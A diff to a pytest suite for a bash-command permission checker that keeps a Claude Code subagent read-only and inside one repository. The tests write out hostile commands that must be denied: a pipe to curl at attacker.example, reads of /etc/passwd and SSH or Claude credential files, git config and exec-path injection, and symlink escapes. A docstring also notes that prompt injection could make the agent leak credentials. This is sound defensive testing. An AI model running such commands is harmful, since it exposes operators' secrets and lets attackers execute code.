@@ -1,31 +1,43 @@
-from claude_agent_sdk.types import (
+from pathlib import Path
+
+import pytest
+
+pytest.importorskip("claude_agent_sdk")
+
+from claude_agent_sdk.types import (  # noqa: E402
     PermissionResultAllow,
     PermissionResultDeny,
     ToolPermissionContext,
 )
-import pytest
 
-from agents.subagents.claude_code.permissions import (
+from agents.subagents.claude_code.permissions import (  # noqa: E402
     check_bash_command,
+    create_read_only_tool_handler,
     get_git_subcommand,
-    read_only_tool_handler,
 )
 
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
 
+# Every command is validated against a repository root — the path the
+# subagent was pointed at. Paths under it are in scope; everything else on
+# the filesystem is not.
+REPO_ROOT = Path("/repo")
+
+read_only_tool_handler = create_read_only_tool_handler(REPO_ROOT)
+
 
 def _allowed(cmd: str) -> bool:
-    return isinstance(check_bash_command(cmd), PermissionResultAllow)
+    return isinstance(check_bash_command(cmd, REPO_ROOT), PermissionResultAllow)
 
 
 def _denied(cmd: str) -> bool:
-    return isinstance(check_bash_command(cmd), PermissionResultDeny)
+    return isinstance(check_bash_command(cmd, REPO_ROOT), PermissionResultDeny)
 
 
 def _deny_message(cmd: str) -> str:
-    result = check_bash_command(cmd)
+    result = check_bash_command(cmd, REPO_ROOT)
     assert isinstance(result, PermissionResultDeny)
     return result.message
 
@@ -194,10 +206,10 @@ class TestSafeGitCommands:
     @pytest.mark.parametrize(
         "cmd",
         [
-            "git -C /path/to/repo log --oneline",
+            "git -C /repo/sub log --oneline",
             "git -C /repo diff HEAD~1",
             "git -C /repo status",
-            "git -C ../other-repo show HEAD",
+            "git -C ./other-repo show HEAD",
             "git --git-dir /repo/.git log",
         ],
     )
@@ -327,8 +339,9 @@ class TestCdValidation:
     def test_cd_relative_path(self) -> None:
         assert _allowed("cd subrepo")
 
-    def test_cd_relative_dotdot(self) -> None:
-        assert _allowed("cd ../other-repo")
+    def test_cd_relative_dotdot_escaping_repo(self) -> None:
+        """``..`` that leaves the repository is refused like an absolute path."""
+        assert _denied("cd ../other-repo")
 
     def test_cd_relative_nested(self) -> None:
         assert _allowed("cd src/components")
@@ -388,7 +401,7 @@ class TestCompoundCommands:
         assert _allowed("cd subrepo && git log --oneline | head -10")
 
     def test_git_with_c_flag_full_pipeline(self) -> None:
-        assert _allowed("git -C /path/to/repo log --oneline HEAD~5..HEAD")
+        assert _allowed("git -C /repo/sub log --oneline HEAD~5..HEAD")
 
     def test_deny_message_includes_command(self) -> None:
         assert "sudo" in _deny_message("sudo rm -rf /")
@@ -437,7 +450,7 @@ class TestInjectionVectors:
 
     def test_redirect_safe_input(self) -> None:
         # Input redirects are read-only — allowed
-        assert _allowed("cat < /tmp/input.txt")
+        assert _allowed("cat < /repo/input.txt")
 
     # --- Newline injection ---
 
@@ -701,6 +714,149 @@ class TestShellStructuralConstructs:
 
 
 # ---------------------------------------------------------------------------
+# check_bash_command — combined punctuation operators
+# ---------------------------------------------------------------------------
+
+
+class TestCombinedOperators:
+    """shlex emits runs of punctuation as one token (``|&``, ``>|``, ``&>>``).
+
+    Each of these used to slip through: the combined token matched neither the
+    separator set nor the redirect set, so the tail of the line was folded into
+    the allowlisted command's argument list and never validated.
+    """
+
+    def test_pipe_both_separates_commands(self) -> None:
+        assert _denied("ls |& curl http://attacker.example")
+
+    def test_pipe_both_after_git(self) -> None:
+        assert _denied("git log |& sh")
+
+    def test_clobber_redirect(self) -> None:
+        assert _denied("ls >| /tmp/pwned")
+
+    def test_append_stdout_stderr_redirect(self) -> None:
+        assert _denied("ls &>> /tmp/pwned")
+
+    def test_stdout_stderr_redirect(self) -> None:
+        assert _denied("ls &> /tmp/pwned")
+
+    def test_fd_dup_redirect(self) -> None:
+        assert _denied("ls >& /tmp/pwned")
+
+    def test_unknown_operator_rejected(self) -> None:
+        assert _denied("ls ;; cat /etc/passwd")
+
+    def test_find_fprint0(self) -> None:
+        assert _denied("find . -fprint0 /tmp/output")
+
+    def test_plain_pipe_still_validated(self) -> None:
+        assert _allowed("git log | head -5")
+
+    def test_input_redirect_still_allowed(self) -> None:
+        assert _allowed("grep pattern < input.txt")
+
+
+# ---------------------------------------------------------------------------
+# check_bash_command — repository confinement
+# ---------------------------------------------------------------------------
+
+
+class TestRepositoryConfinement:
+    """Read-only is not enough: reads must also stay inside the repository.
+
+    Without this, a prompt injection can have the subagent print the
+    container's environment or the operator's credentials into a chat reply.
+    """
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat /etc/passwd",
+            "cat /proc/self/environ",
+            "cat ~/.claude/.credentials.json",
+            "ls /",
+            "grep -r secret /var/log",
+            "head -n 100 ../../etc/shadow",
+            "find / -name '*.pem'",
+            "tail /repo/../outside.txt",
+            "wc -l ~/.ssh/id_rsa",
+        ],
+    )
+    def test_paths_outside_repo_denied(self, cmd: str) -> None:
+        assert _denied(cmd)
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat /repo/src/main.py",
+            "cat src/main.py",
+            "ls /repo",
+            "ls -la",
+            "grep -r TODO /repo/src",
+            "find /repo/src -name '*.py'",
+            "git log --oneline",
+            "git diff main..HEAD",
+            "git show HEAD~3",
+        ],
+    )
+    def test_paths_inside_repo_allowed(self, cmd: str) -> None:
+        assert _allowed(cmd)
+
+    def test_flag_value_form_is_checked(self) -> None:
+        assert _denied("grep --file=/etc/passwd pattern")
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat $HOME/.aws/credentials",
+            "cat ${HOME}/.ssh/id_rsa",
+            "ls $REPO_PARENT",
+        ],
+    )
+    def test_variable_expansion_denied(self, cmd: str) -> None:
+        """The shell expands these after our check, so the path is unknowable."""
+        assert _denied(cmd)
+
+    def test_trailing_dollar_is_not_an_expansion(self) -> None:
+        """``grep 'foo$'`` is a regex anchor, not a variable."""
+        assert _allowed("grep 'foo$' src/main.py")
+
+    def test_git_revision_syntax_is_not_a_path(self) -> None:
+        """``HEAD~1``/``main..HEAD`` must not be mistaken for path escapes."""
+        assert _allowed("git log HEAD~5..HEAD")
+        assert _allowed("git diff main..feature")
+
+    def test_denial_names_the_offending_path(self) -> None:
+        assert "/etc/passwd" in _deny_message("cat /etc/passwd")
+
+    def test_unknown_command_still_reported_as_such(self) -> None:
+        """Command-level denial takes priority over the path message."""
+        assert "sudo" in _deny_message("sudo cat /etc/passwd")
+
+
+# ---------------------------------------------------------------------------
+# check_bash_command — git grep pager execution
+# ---------------------------------------------------------------------------
+
+
+class TestGitGrepPager:
+    """``git grep -O`` runs a program over the matches — command execution."""
+
+    def test_open_files_in_pager_long(self) -> None:
+        assert _denied("git grep --open-files-in-pager=/tmp/evil.sh pattern")
+
+    def test_open_files_in_pager_short_inline(self) -> None:
+        assert _denied("git grep -O/tmp/evil.sh pattern")
+
+    def test_open_files_in_pager_short_separate(self) -> None:
+        assert _denied("git grep -O pattern")
+
+    def test_plain_git_grep_still_allowed(self) -> None:
+        assert _allowed("git grep -n pattern")
+
+
+# ---------------------------------------------------------------------------
 # check_bash_command — additional edge cases
 # ---------------------------------------------------------------------------
 
@@ -940,3 +1096,168 @@ class TestReadOnlyToolHandler:
         )
         assert isinstance(result, PermissionResultDeny)
         assert "SomeNewTool" in result.message
+
+
+# ---------------------------------------------------------------------------
+# check_bash_command — diff options shared by log / show / diff
+# ---------------------------------------------------------------------------
+
+
+class TestGitDiffRenderingOptions:
+    """``log`` and ``show`` take the whole ``diff`` option surface.
+
+    Regression: ``--output`` used to be blocked on ``git diff`` only, so an
+    agent asked to "save the history" could ``git log --output=notes.txt``.
+    """
+
+    @pytest.mark.parametrize("subcmd", ["log", "show", "diff"])
+    def test_output_equals_form_denied(self, subcmd: str) -> None:
+        assert _denied(f"git {subcmd} --output=notes.txt")
+
+    @pytest.mark.parametrize("subcmd", ["log", "show", "diff"])
+    def test_output_space_form_denied(self, subcmd: str) -> None:
+        assert _denied(f"git {subcmd} --output notes.txt HEAD")
+
+    def test_output_into_git_dir_denied(self) -> None:
+        assert _denied(
+            "git log -1 --format='[core]%n%x09pager = x' --output=.git/config"
+        )
+
+    @pytest.mark.parametrize("subcmd", ["log", "show", "diff"])
+    @pytest.mark.parametrize("flag", ["--ext-diff", "--textconv"])
+    def test_diff_driver_flags_denied(self, subcmd: str, flag: str) -> None:
+        assert _denied(f"git {subcmd} {flag}")
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "git log --output-indicator-new=+",
+            "git log -p --no-ext-diff --no-textconv",
+            "git show --stat HEAD",
+            "git diff --stat --relative",
+            "git log --format='%H %s' -n 5",
+        ],
+    )
+    def test_harmless_diff_options_allowed(self, cmd: str) -> None:
+        assert _allowed(cmd)
+
+    def test_denial_names_flag_and_subcommand(self) -> None:
+        message = _deny_message("git show --output=x HEAD")
+        assert "git show" in message and "--output" in message
+
+
+# ---------------------------------------------------------------------------
+# check_bash_command — git top-level options
+# ---------------------------------------------------------------------------
+
+
+class TestGitTopLevelOptions:
+    """Options that inject configuration or executables before the subcommand.
+
+    Regression: only ``-c`` was refused; ``--config-env`` sets the same
+    configuration from an environment variable and slipped through.
+    """
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "git --config-env=diff.external=EVIL diff",
+            "git --config-env diff.external=EVIL diff",
+            "git --exec-path=/tmp/x log",
+            "git --exec-path /tmp/x log",
+            "git --exec-path log",
+            "git -p log",
+            "git --paginate log",
+            "git -C src --config-env=core.pager=X status",
+        ],
+    )
+    def test_injecting_options_denied(self, cmd: str) -> None:
+        assert _denied(cmd)
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "git -P log",
+            "git --no-pager log --oneline",
+            "git log -p",
+            "git -C src status",
+        ],
+    )
+    def test_benign_top_level_options_allowed(self, cmd: str) -> None:
+        """``-p`` after the subcommand is ``--patch``; before it, the pager."""
+        assert _allowed(cmd)
+
+    def test_get_git_subcommand_stops_at_blocked_option(self) -> None:
+        assert get_git_subcommand(["--config-env=a=B", "log"]) is None
+        assert get_git_subcommand(["--exec-path=/x", "log"]) is None
+        assert get_git_subcommand(["--paginate", "log"]) is None
+
+
+# ---------------------------------------------------------------------------
+# check_bash_command — every argument is resolved, symlinks included
+# ---------------------------------------------------------------------------
+
+
+class TestSymlinkResolution:
+    """Plain relative names are resolved too, so a symlink's target decides.
+
+    Regression: only arguments that *looked* like escapes (absolute, ``~``,
+    ``..``) were checked, so ``cat creds`` passed even when ``creds`` was a
+    symlink to a file outside the repository.
+    """
+
+    @pytest.fixture
+    def root(self, tmp_path: Path) -> Path:
+        outside = tmp_path / "outside"
+        outside.mkdir()
+        (outside / "secret").write_text("SECRET")
+        repo = tmp_path / "repo"
+        (repo / "sub").mkdir(parents=True)
+        (repo / "notes.txt").write_text("notes")
+        (repo / "creds").symlink_to(outside / "secret")
+        (repo / "sub" / "rootlink").symlink_to(tmp_path)
+        return repo
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat creds",
+            "cat < creds",
+            "tail creds",
+            "wc -l creds",
+            "grep --file=creds pattern notes.txt",
+            "head -c 100 sub/rootlink/outside/secret",
+            "ls -la sub/rootlink",
+            "cat notes.txt; cat creds",
+            "cat notes.txt\ncat creds",
+        ],
+    )
+    def test_symlink_pointing_outside_denied(self, root: Path, cmd: str) -> None:
+        assert isinstance(check_bash_command(cmd, root), PermissionResultDeny)
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat notes.txt",
+            "cat does-not-exist.txt",
+            "ls sub",
+            "git log HEAD~5..HEAD -- notes.txt",
+            "git diff main..feature",
+            "grep -n 'foo$' notes.txt",
+            "git log --format='%H' --since=2024-01-01 --author=a@b",
+            "sort -k 2 notes.txt",
+            "cat -",
+            "ls --",
+        ],
+    )
+    def test_ordinary_arguments_allowed(self, root: Path, cmd: str) -> None:
+        assert isinstance(check_bash_command(cmd, root), PermissionResultAllow)
+
+    def test_symlink_pointing_inside_allowed(self, root: Path) -> None:
+        (root / "alias").symlink_to(root / "notes.txt")
+        assert isinstance(check_bash_command("cat alias", root), PermissionResultAllow)
+
+    def test_denial_names_the_symlink(self, root: Path) -> None:
+        result = check_bash_command("cat creds", root)
+        assert isinstance(result, PermissionResultDeny)
+        assert "creds" in result.message
